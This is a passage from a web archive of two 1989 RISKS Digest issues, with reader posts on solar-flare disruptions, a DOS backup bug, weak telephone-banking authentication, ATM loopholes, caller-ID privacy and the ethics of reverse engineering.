carried out the necessary modifications had we needed to...'"
 
"It has been suggested that Rear-Admiral Williams has bowed to pressure
from the New Zealanders, who are heavily sponsored.  This was roundly
rejected last night by Captain Brian Evans, the race secretary...
 
"He added:  `The matter will be cleared up next week when we will be 
announcing our decision.'...
 
"If NCB Ireland were to be modified to make it competitive with the New
Zealanders, the expense would be formidable.  For instance, a new keel
would cost L/40,000, a mainsail L/10,000 and a new rig as much as 
L/150,000.
 
"At this stage, it would appear that the RNSA will have no option other
than to back down in the face of overwhelming protests...  Meanwhile,
leading yachtsmen will be awaiting next week's decision with some
apprehension.  This is clearly a case in which a considerable quantity
of oil will be necessary to calm troubled waters."

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Sunspots &amp; Communications
</A>
</H3>
<address>
Cliff Stoll
&lt;<A HREF="mailto:cliff%cfa204@harvard.harvard.edu ">
cliff%cfa204@harvard.harvard.edu 
</A>&gt;
</address>
<i>
Mon, 13 Mar 89 13:55:36 est
</i><PRE>

There's a major sunspot group on the sun ... it's visible to the naked eye
(with suitable protection, of course).  Largest sunspot in a long time.
At least two flares have been associated with this group.

Ten or twenty years ago, we'd probably have heard warnings that communications
circuits might be disrupted, due to ionospheric interactions with the solar
wind.

Today, however, it's a rare communication link that depends on ionospheric
reflections (although military over-the-horizon radars do...).

So this sunspot won't affect our communications, huh?  
You say we've nothing to worry about?

Maybe.  Here's a few things to worry about:

  1)  Geomagnetic storms can screw up magnetic compasses.

  2)  Satellites in geosynchronous orbit have a rough time of it.
      Twice a year, (at each equinox), they're shadowed by the earth,
      and their solar panels don't generate electricity at night.
      In addition, the high energy particles can get wicked
      at this altitude, especially when there's a major solar flare.
      Well, it's near the equinox (so the comsats are battery
      powered at night), and there's bad solar flares.
      Result: these satellites are being stressed.

  3)  Earth satellite lifetimes depend on the shape and size of the
      earth's atmosphere.  Satellites in low orbits may have their
      lifespans shortened drastically when the atmosphere bulges out.
      What causes such bulges?  Increased solar activity.  

      If this sunspot -- largest in memory -- is an indicator of a very
      active sun in the next few years, low-flying satellites may be
      in trouble.  

Best of cheers,  Cliff Stoll     cliff@cfa200.harvard.edu    617/495-7147
Smithsonian Astrophysical Observatory 
Harvard - Smithsonian Center for Astrophysics

</PRE>
<HR><H3><A NAME="subj2.2">
Sunspots &amp; Communications (O Solar Milhaud!)
</A>
</H3>
<address>
Peter Neumann 
&lt;<A HREF="mailto:neumann@csl.sri.com">
neumann@csl.sri.com
</A>&gt;
</address>
<i>
Wed, 15 Mar 1989 9:28:47 PST
</i><PRE>

Solar flares resulting from the unprecendented sunspot activity have reportedly
been wreaking havoc with communications around here since about 10 March.  (And
the peak of the 11-year sunspot cycle is still about a year away!) Radio and
satellite communications have been seriously affected.  In the Mount Diablo
area of California, there have been many reports of garage door openers failing
to operate.  (Younger RISKS readers will not remember a different effect caused
by signals from the first Sputnik, which merrily opened and closed garage doors
each time it traversed the U.S. -- at the time there was little redundancy in
the g.d. control signals.  This time the controls are apparently being jammed.)

            [The "Subject:" line subtitle is due to the fact that I had 
            awful radio reception on hearing a piece by Darius Milhaud.]

            [By the way, today is the day to "Beware The Ides of March",
            which means that The Calends of April is only 17 days away.
            As we have learned, Beware the Calends of April also.]

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
pengo and the Wily hackers (<A HREF="/Risks/8.37.html">RISKS-8.37</A>)
</A>
</H3>
<address>
Klaus Brunnstein 
&lt;<A HREF="mailto:brunnstein%rz.informatik.uni-hamburg.dbp.de@RELAY.CS.NET">
brunnstein%rz.informatik.uni-hamburg.dbp.de@RELAY.CS.NET
</A>&gt;
</address>
<i>
14 Mar 89 11:04 GMT+0100
</i><PRE>

In RISK FORUM 8.37, `Pengo' Hans Huebner stated that he had no share in the
KBG case as I mentioned in my RISK report. Since I myself had no share in 
the KGB hack (and in this sense, I am not as good a source as Pengo!), I tried 
to transmit only information where I had at least *two independent sources* of
*some credibility*. In Pengo's case (where I was rather careful because I could
not believe what I read), my two sources were:

    - the SPIEGEL report (I personally agree that names should be avoided as
      long as current investigations are underway; yet in this cases, the 
      names have been widely published in FRG and abroad);

    - a telephone conversation with a leading CCC person (before I present his
      name, I will inform him); after he had informed me about a public debate
      at Hannover fair (where the German daily business newspaper, Wirtschafts-
      woche had organised a discussion with data protection people and CCC),
      I asked him whether he knew of Pengo's contribution; he told me that
      he directly asked Pengo: '`Did you, without pressure and at your own 
      will, work for the Russians?', and Pengo answered: `Yes'. He told me that
      he immediately cut-off any contact to Pengo. Evidently, there was a 
      controversial discussion in Chaos Computer Club whether on should react
      in such a strict manner. I understand the strong reaction because the
      KGB hackers severely damaged CCCs attempt to seriously contribute to
      the public discussion of some of the social consequences of computers.
      They now face, more seriously than before, the problem of being regarded
      as members of a criminal gang.

In the bulk of information, I found much desinformation (not only regarding
computer stuff, like the notion of a sold `C-Compiler, which is a program to
accomodate old programs to modern computers'). I didnot mention such des-
informing non-facts (like the rumor that also personal information was sold) 
because I had only one source, which moreover was of very limited credability. 

Klaus Brunnstein

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Toshiba DOS 3.3 Backup deletes files
</A>
</H3>
<address>
Fiona M Williams 
&lt;<A HREF="mailto:fiona@euroies.ucd.ie">
fiona@euroies.ucd.ie
</A>&gt;
</address>
<i>
Tue, 14 Mar 89 14:34:50 GMT
</i><PRE>

A colleague of mine had just started to backup the hard disk of his Toshiba
3200 using the Toshiba DOS 3.3 backup command. While backup was still looking
at the root directory we had a power failure in the office. A couple of gnashes
later he re-booted the T3200 only to get the message "Bad or missing command
interpreter."  (This generally means that command.com has been knackered.)
Also, when we looked at the backup diskette, there was nothing on it!

Having (eventually) found a Toshiba DOS 3.3 diskette we managed to have a look
at the hard disk only to find that all files in the root directory *had been
deleted*. (Sub-directories were ok though.) Norton's quick un-erase came to the
rescue so we managed to recover everything after about an hour.

I'd hate to think what might have happened if we'd had the power failure when
backup was on its 20th diskette, rather than its first, but in any case, the
moral seems to be that you should sometimes make a backup before making a
backup!

Stephen Farrell, MANTIS LTD.      (stephen_farrell_mantis@eurokom.ucd.ie)

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Star Trek computer virus
</A>
</H3>
<address>
Kevin Rushforth
&lt;<A HREF="mailto:kcr@Sun.COM ">
kcr@Sun.COM 
</A>&gt;
</address>
<i>
Tue, 14 Mar 89 22:30:12 PST
</i><PRE>

I realize that the fictional world of Star Trek is not normally an appropriate
risks topic, but I feel this is an exception.  The next original episode of
"Star Trek: The Next Generation" (scheduled to air the week of 3/20-3/26) is
titled "Contagion" and is about (you guessed it) a computer virus:

   The Enterprise's computer system falls prey to a mysterious electronic
   "virus" which programs the ship to self destruct.

This episode may prove interesting to readers of comp.risks.  It raises
an interesting question as to what would happen if the on-board
computer of an F-16 or Space Shuttle were to contract a virus.

Kevin C. Rushforth, Sun Microsystems

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Re: NASA to replace top-level personnel with Expert Systems
</A>
</H3>
<address>
&lt;<A HREF="mailto:henry@utzoo.UUCP">
henry@utzoo.UUCP
</A>&gt;
</address>
<i>
Sun, 12 Mar 89 01:33:01 -0500
</i><PRE>

A cynic might say that replacing many of NASA's top-level people with, say, a
PC each would be an *improvement*, bugs and all...  Let us not forget that some
human beings are far from fully debugged.  Today's NASA is notorious for bad
management (e.g. Challenger) and too much management (NASA's supervisor:worker
ratio today is twice what it was during Apollo).  If nothing else, a program
spouting nonsense is easier to ignore than a manager spouting nonsense --
programs have less political clout.
                                     Henry Spencer at U of Toronto Zoology
                                 uunet!attcan!utzoo!henry henry@zoo.toronto.edu

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
 Pushbutton Banking
</A>
</H3>
<address>
Lynn R Grant 
&lt;<A HREF="mailto:Grant@DOCKMASTER.ARPA">
Grant@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Wed, 15 Mar 89 14:00 EST
</i><PRE>

My bank, the Suburban Bank of Palatine (Illinois) has just announced
that starting April 1st (April Fool's Day!)  they will be implementing
"Pushbutton Banking," which will allow you to query balances, find out
what checks have cleared, and transfer balances between accounts, all
from the comfort of your easy chair, using your Touch-Tone phone.

All you need to access this is your account number and your security
code, which is the last four digits of your SSN.  I called the bank and
asked them if the security code was changable by the user.  They said
no, but how many people know your account number and SSN.  I pointed out
to them that since my Illinois driver's license has my SSN on it, every
time I pay by check at a store, I am showing the cashier my account
number and SSN.  The bank said that that hadn't occurred to them.  They
offerred to set up my account so that nobody, including me, could use
the pushbutton banker on it, and of course, I accepted.

It is certainly worrysome that the people charged with keeping my money
safe don't think about these things.  True, the pushbutton banker could
probably not be used to steal money, but it could certainly invade your
privacy, and could be used to perform denial-of-service attacks (someone
dials in and transfers all your checking account money to your savings
account, causing all your checks to bounce.  The merchants you paid by
check all charge you their 10 or 20 buck returned check fee.  When you
try to explain your way out of the charges, the bank says "Well, it must
have been you; who else would know your account number and security
code?").

--Lynn Grant

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Risks of telephone access to your bank account
</A>
</H3>
<address>
Michael McClary
&lt;<A HREF="mailto:michael@xanadu.com ">
michael@xanadu.com 
</A>&gt;
</address>
<i>
15 Mar 89 13:13:05 GMT
</i><PRE>

Upon moving to California, I opened an account at a local bank (Wells Fargo).
They took down a bunch of personal information to use to identify myself when
using their 24-hour telephone account-munging service.  The information was a
standard set, such as mother's maiden name.  All public record, as I recall,
but in any case nothing a cheap private detective couldn't dig up, given a
little time.  So anyone who'd, say, gotten hold of my checkbook, could find out
how much it was good for.

But the surprise came when I was back in Michigan finishing the move, and
needed to transfer funds to cover a check.  Instead of a random set of the
items, they asked for EVERY SINGLE ONE of them.  Anyone listening in on the
phone would have all they'd need to use the service.

Now combine that with cellular phones that:
 - are not scrambled,
 - don't switch channels enough to break up a conversation,
 - can be recieved on the high end of an old TV set's UHF dial
 - are generally owned by busy people with money
and you've got the makings of some nasty surprises.

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Limitless ATMs (Re: RISKS DIGEST 8.37)
</A>
</H3>
<address>
John Murray
&lt;<A HREF="mailto:johnm@uts.amdahl.com ">
johnm@uts.amdahl.com 
</A>&gt;
</address>
<i>
15 Mar 89 20:43:27 GMT
</i><PRE>

&gt; From: @sri-unix.UUCP, geoff@itcorp.com
&gt; 
&gt;       . . . .   A credit card and the associated PIN were stolen from my
&gt; home, and the thief then used the card to withdraw $3900 in cash from ATM's.
&gt; Since the ATM's had a per-transaction limit of $300, the withdrawal was done in
&gt; 13 separate transactions.  The interesting thing is that only two ATM's were
&gt; used for all of these operations! Further, the card only had a $3000 credit
&gt; limit, and about $600 was already in use.

Several ATM systems have (used to have?) loopholes in them, which allowed
this type of thing to occur. For example:

* In regions where on-line links are unreliable, a machine might use floppy
  disks for its data. The transaction file and "hot-card" data are only
  updated once a day, and the bank moves this info using its regular
  courier system. All sorts of risks can occur over public holiday weekends.

* The card in question is a credit card. It seems unlikely that data for
  ALL cards EVER issued ANYWHERE is instantly available EVERYWHERE,
  especially across international boundaries. Perhaps some systems just
  accept this potential for loss.

* Some off-line systems could rewrite data onto the card, so that taking the
  card to a different machine wouldn't work. However, using joint cards could
  not be trapped.

 - John Murray, Amdahl Corp. (My own opinions, etc.)

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
Re: Prisoner access to confidential drivers' records
</A>
</H3>
<address>
Scot E Wilcoxon
&lt;<A HREF="mailto:sewilco@datapg.mn.org ">
sewilco@datapg.mn.org 
</A>&gt;
</address>
<i>
14 Mar 89 05:42:21 GMT
</i><PRE>

Much of the information which was mentioned is already easily
available.  For $3, the California DMV will give you auto registration
information.  "Names, addresses", and "what cars they drive" certainly,
and maybe also "loans" (I forgot to ask the DMV about loans, but I
know Minnesota lists loan info).  Auto and driver registration
information is public in most states.

Apparently the California government has considered the license holders' desire
for privacy (or perhaps of the ignorance of the public status of the
information).  Along with the $3, you must give a signed statement of the
reason why you want the information.  The license holder then is notified by
mail that the information was delivered, and of the reason you gave.

Scot E. Wilcoxon

</PRE>
<A NAME="subj11"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj11.1">
     Risks of Human Emulating Machinery
</A>
</H3>
<address>
Jon Loux 
&lt;<A HREF="mailto:JLOUX@UCONNVM.BITNET">
JLOUX@UCONNVM.BITNET
</A>&gt;
</address>
<i>
Mon, 13 Mar 1989 09:59:51 EST
</i><PRE>

In reply to "Risks of Congenial Machinery" from Robert Steven Glickstein.
Hear, hear.  In the effort to make our machines more like humans, we have
failed.  The best we can do is make a parroting parody of some intellectual
function.  Useful?  Yes.  Important?  Yes.  Vital to the functioning of many
(most) institutions in our society?  Yes.  But human?  No.  We cannot make
our machines more like humans, so we have done the next best thing.  We have
made our humans more like machines.  The silicon revolution is nothing more
than the industrial revolution without the smoke.  Mechanized.  Mass produced.
And impersonal.

A case in point.  A senior project manager in the DP shop of a large defense
contractor told me a story about his home bank back in the town in New York
where he grew up.  It used to be that the tellers and managers of the bank
knew everybody in the town.  If a check came in without sufficient funds in
your account to cover it (Banks don't like this, for some reason) they would
call you at work and make some arrangements for you to cover it (run down and
make a deposit, hold the check, whatever).  It was a community matter.  Now,
with ATMs and electronic funds transfers, etc., walking into the bank is the
financial equivalent of entering a meat locker.

"But Bob," I said.  "The bank must be serving a larger number of people.  It's
just impossible to be personal in a corporate setting.  This isn't Bailey's
Savings and Loan, you know."

"No," he said.  "But the town's population hasn't gone up in fifty years."

You decide.

Jon Loux.  University of Connecticut.  

</PRE>
<A NAME="subj12"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj12.1">
New Sprint Card
</A>
</H3>
<address>
Ken Harrenstien 
&lt;<A HREF="mailto:KLH@SRI-NIC.ARPA">
KLH@SRI-NIC.ARPA
</A>&gt;
</address>
<i>
Thu, 9 Mar 89 13:23:18 PST
</i><PRE>

Regarding the message from Will Martin:
... Fred Lawrence, Sprint's executive vice president for network development,
    said the Voicecard would work a little like the company's Foncard: Callers
    dial the phone number printed on the card, adding a second number such as a
    birthdate, and then give a two-second verbal password. Sprint equipment
    compares the voice print with one that is on record. The call goes through
    only if the voice prints match, Lawrence said. ...

My hair rose when I saw this.  I may be over-reacting in the absence of
additional information, but I sincerely hope this idea does not spread.  If it
did, I won't be able to make a long-distance call, because I'm deaf.

Let me explain for the benefit of people who don't get it.  How could deaf
people make calls in the first place anyway?  There are normally two ways:

First, they can use TDDs (Telecommunication Device for the Deaf).
This is typically a small terminal-like unit that uses half-duplex FSK
(1400/1800 Hz) to transmit Baudot codes at 45.45 baud.  More foresighted
designs also provide the capability of using ASCII with a standard 300
baud (Bell 103) full-duplex modem.  People can thus type to each other.

Second, they can use an interpreter -- the usual resort when one of the
parties is hearing and doesn't have a TDD.  But it's very rare that one
can use the same interpreter (i.e. the same voice) every time.

Perhaps the Sprint people have thought about this, and have an
alternate security method for those cases.  But I rather suspect not.
I don't have any problem with proposals for whiz-bang new techno-fixes
that are focused on just one modality, but all too often these ideas
unwittingly exclude other modes, which is exactly the wrong thing to
do where a public service is concerned.

Think about color-coded displays.  Touch displays.  Mice.  Voice-synthesized
responses.  And so on.  None of these is suitable for everyone, but as long as
a system is not limited to just one way of doing things, no one will be
excluded.  I sincerely hope that in the rush to automate everything, designers
take advantage of the flexibility that computers give them to provide for as
many alternatives as possible.  The person who benefits will someday be you.
--Ken

</PRE>
<A NAME="subj13"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj13.1">
Incoming-call identification
</A>
</H3>
<address>
David Albert
&lt;<A HREF="mailto:albert@harvard.harvard.edu ">
albert@harvard.harvard.edu 
</A>&gt;
</address>
<i>
Thu, 2 Mar 89 19:04:57 EST
</i><PRE>

Today's (3/2/89) Boston Globe has an article on telephone features,
including incoming-call identification.  I quote a relevant section:

	[Spokesperson for Bell Atlantic Karen] Johnson ... brushed aside
	questions about the privacy of incoming callers.  "We feel that
	in most cases, the caller gives up anonymity and the customer
	gains privacy and security.  In all the time we've offered it,
	we've had very few complaints."

	New England Telephone's [product manager for the new calling
	services Gerald J.] Malette agreed.  "We feel the person being
	called has the right to know who's calling," he said.

Well, we keep bringing up the issue on the net; perhaps it's time we started
complaining directly to the people keeping track of the number of complaints,
such as the two named above.  In particular, I suggest we bring to their
attention the issue of the confidentiality of calls to services such as the
Samaritans, to the police (on their business number), to the government (say,
asking questions about tax laws), and to businesses in general.  Do we really
want to give up our privacy when a business might turn around and compile a
mailing list (or worse, a calling list) based on telephone calls received?
When we want to ask an anonymous question of a government agency?  When we are
baring our souls to a suicide line? Let's all get out there and complain before
it's too late (if we're not too late already).

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/8.37.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.39.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-89</DOCNO>
<DOCOLDNO>IA013-000132-B047-209</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/8.39.html 128.240.150.127 19970217030018 text/html 24241
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:58:44 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 8: Issue 39</TITLE>
<LINK REL="Prev" HREF="/Risks/8.38.html">
<LINK REL="Up" HREF="/Risks/index.8.html">
<LINK REL="Next" HREF="/Risks/8.40.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/8.38.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.8.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/8.40.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 8: Issue 39</H1>
<H2> Thursday 16 March 1989  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I><P><B>
</B><H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
  Solar flares vs. garage door openers 
</A>
<DD>
<A HREF="#subj1.1">
Steve Bellovin
</A><br>
<A HREF="#subj1.2">
 Peter Scott
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Sunspots and Power Lines 
</A>
<DD>
<A HREF="#subj2.1">
John Coughlin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Man-machine interfaces and perception-impaired people 
</A>
<DD>
<A HREF="#subj3.1">
David A. Honig
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: reverse engineering of type fonts 
</A>
<DD>
<A HREF="#subj4.1">
Herman J. Woltring
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Ethics Question 
</A>
<DD>
<A HREF="#subj5.1">
Marc Mengel
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Toshiba DOS 3.3 Backup deletes files 
</A>
<DD>
<A HREF="#subj6.1">
Jay Elinsky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Re: IBM's claims to omnipotence 
</A>
<DD>
<A HREF="#subj7.1">
Dr Robert Frederking
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Re: Pushbutton Banking 
</A>
<DD>
<A HREF="#subj8.1">
Tom Coradeschi
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Solar flares vs. garage door openers
</A>
</H3>
<address>
&lt;<A HREF="mailto:ulysses!smb@research.att.com">
ulysses!smb@research.att.com
</A>&gt;
</address>
<i>
Thu, 16 Mar 89 10:40:37 EST
</i><PRE>

You write that the solar flares have been affecting garage door openers.  Maybe
not.  According to a report on CBS News this morning, the FCC is aware of the
problem, refuses to say what it is, but says it will clear up in about 6 weeks.
When asked if it's a secret government project, they refuse to say.

The transmissions are from the top of Mount Diablo, but the FCC [office in
Livermore] refuses to identify the agency sending.  They'll be transmitting
through May 2.  Quoth an FCC representative:  ``We're not obligated to do
anything'' because the openers operate on frequencies also used by the
government, and the openers are ``unprotected devices''.  His solution: switch
to another frequency.

I wonder what other equipment, besides garage door openers, is failing?  And if
they -- whoever ``they'' are -- even thought about the question first?

Steve Bellovin                                   
                [This report was also noted by Jan Wolitzky and Tim Garlick.
                Also, Michael Sclafani -- who had not heard it -- wondered
                how a solar flare problem could arise only in the Mt. Diablo
                area.  PGN]

</PRE>
<HR><H3><A NAME="subj1.2">
Re: Sunspots &amp; Communications
</A>
</H3>
<address>
Peter Scott 
&lt;<A HREF="mailto:PJS@grouch.JPL.NASA.GOV">
PJS@grouch.JPL.NASA.GOV
</A>&gt;
</address>
<i>
Thu, 16 Mar 89 09:30:38 PST
</i><PRE>

[...]  I thought that g.d. openers operated in the microwave range; isn't this
power level of transmission unhealthy?

Peter Scott (pjs@grouch.jpl.nasa.gov)
                                        [Especially if you jack up the power.
                                        You need jacks or better to open.  PGN]

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
 Sunspots and Power Lines
</A>
</H3>
<address>
John Coughlin 
&lt;<A HREF="mailto:John_Coughlin@RMC.BITNET">
John_Coughlin@RMC.BITNET
</A>&gt;
</address>
<i>
16 Mar 89 12:19:00 EST
</i><PRE>

Earlier this week a massive blackout hit the province of Quebec, plunging about
6 million people into darkness.  A substation on one of the main lines feeding
electricity from the James Bay hydroelectric dams to the south of the province
had shut down.  The suspected reason:  the recent intense solar activity. It
took almost half a day to rectify (pun intended) the problem, because it was
first necessary to identify which of several substations located in a remote
area was at fault.

John Coughlin, BULL Kingston        (613) 541-6439       &lt;JC@RMC.BITNET&gt;

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
man-machine interfaces and perception-impaired people
</A>
</H3>
<address>
"David A. Honig" 
&lt;<A HREF="mailto:honig@BONNIE.ICS.UCI.EDU">
honig@BONNIE.ICS.UCI.EDU
</A>&gt;
</address>
<i>
Thu, 16 Mar 89 12:36:00 -0800
</i><PRE>

In RISKS [ Wednesday 15 March 1989   Volume 8 : Issue 38 ]
Ken Harrenstien &lt;KLH@SRI-NIC.ARPA&gt; writes, 

 Think about color-coded displays.  Touch displays.  Mice.  Voice-synthesized
 responses.  And so on.  None of these is suitable for everyone, but as long as
 a system is not limited to just one way of doing things, no one will be
 excluded.  I sincerely hope that in the rush to automate everything, designers
 take advantage of the flexibility that computers give them to provide for as
 many alternatives as possible.  The person who benefits will someday be you.
 --Ken

 The developers of advanced man-machine interfaces who wish to use
stereooptical displays (so users can manipulate virtual 3-D objects)
will have to contend with the fact that approximately 10% of the population
has some form of stereodeficiency (usually caused by eye problems 
as an infant).  Groups at NASA, MIT Media Lab, etc. have working prototypes,
and it is common for CAD/CAM users to employ 3-D computer graphics.

David Honig, Dept of Info &amp; Comp Sci, Univ. of Calif., Irvine, Ca. 92717

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
 Re: reverse engineering of type fonts (Herman J. Woltring)
</A>
</H3>
<address>

&lt;<A HREF="mailto:WWTMHJW@HEITUE5.BITNET">
WWTMHJW@HEITUE5.BITNET
</A>&gt;
</address>
<i>
Thu, 16 Mar 89 12:03 N
</i><PRE>

Mr Randell Neff's query in Risks Digest 8(37) of March 11, 1989 on the ethics
and legality of investigating a commercial object and of recovering some of the
basic information incorporated in such an object (type fonts information in his
paradigm) seems to have a direct bearing on my own (too lengthy) contribution
in Risks Digest 8(34) of March 2, 1989.  The French proverb "C'est le ton qui
fait la musique" (i.e., the way that you put your arguments will have a strong
bearing on how your views are perceived and interpreted) may be relevant, as Mr
Neff's statement seems to convey that the VorTex people were boasting about
their success in avoiding payment of (too) much money.  If this was indeed the
case, no wonder that some people including Mr Neff became rather upset.

Apart from such psychological factors, the legal and ethical aspects might be
discussed as follows.  I should state that I am neither a lawyer nor an
ethicist, but just a computer architect interested in balancing Intellectual
Property with Freedom of Information, considering the complementary nature of
these aspects under Section 27 of the 1948 Universal Declaration of Human
Rights and under Section 15 of the 1966 International Covenant on Economic,
Social, and Cultural Rights.

Under most legislation in competitive economies, investigating some commercial
object by disassembling it for one's own purposes is perfectly ethical and
legal.  It is only once a direct-for-profit goal becomes the target, that
patent law etc. impose certain constraints.  Freedom of Information, especially
in the USA with its Freedom of Information Act, is an important asset that
should not be forgotten lightly.

If disassembling a (purchased or borrowed) object for research on its
functioning and properties is acceptable in a competitive context, why should
it become inacceptable if done in a not-for-commercial-gain context?  Mr Neff
referred to trade secrets of the font information incorporated in Adobe's
product, and this ties directly into the present, commercial drive to use
copyright law for imposing trade secrecy on the fundamental know-how contained
in a (software) object.  However, trade secrets must be KEPT secret, e.g., by
binding human persons in contract and by storing documents in strong vaults.
It does not make sense to rely on legal connotations that "reverse engineering"
of an object (whether hardware or software) are inappropriate and an
intellectual burglar's instruments for "theft of know-how":  research is
allowed on the topography of hardware chips and under patent law (but licences
may be imposed once the results of such research are to be exploited
commercially); similar research should remain possible under copyright law.
This obtains even more because of the automatic, virtually costless protection
granted by copyright; patent law requires rather expensive, administrative
procedures.

As I am most familiar with the software aspects, I'd like to clarify things in
the software area, although I do not know whether the VorTex/Adobe controversy
is a hardware or a software issue.  Higher computer languages exist in order to
accomodate the cognitive capabilities of the human computer architect and
programmer, and machine languages exist in view of the limitations of current
hardware technology.  The gap between these two is bridged by compilers and
decompilers, and compilers have never been designed in order to impose secrecy
of the know-how underlying a software package.  Thus, decompilers are not
automatically improper tools.

Nevertheless, a number of creative legal experts consider it useful for their
own purposes to declare decompiling and similar forms of analysis and research
first an unethical, then a pirating, and finally an illegal activity.  However,
the mere fact that there is a new market for something (software used to be
freeware!) does not automatically imply that existing tools and technologies
should be reinterpreted as legal instruments.  Such political interpretations
should be judged in terms of the necessary balance between protection and
freedom to copy, lest inappropriate monopolies (and similar advantages) are
generated or no protection is provided at all.

For example, the "Green Paper on Copyright and the Challenge of Technology"
published by the Commission of the European Community last summer makes
specific reference to the information industry's need that reverse engineering
should be allowed lest competition would be stultified:  in each competitive
situation, we may copy relevant aspects from our competitors (not slavishly,
but creatively, by building on those predecessors' work), and this should
certainly remain pos- sible.  Balance and counterbalance must, of course, be
provided, and the copyright doctrine that only form or expression, but not
basic ideas or contents are to be protected, is one of the tools for that
purpose.  In my mind, this means that a legal "fair use / fair dealing"
exemption for research, review, and criticism of a protected object should be
maintained, but that unfair uses should be outlawed.  (The national motto "Je
Maintiendrai" of the Kingdom of The Netherlands may be of some relevance,
here.)

Case law under the Anglo-American Copyright system has been perfectly capable
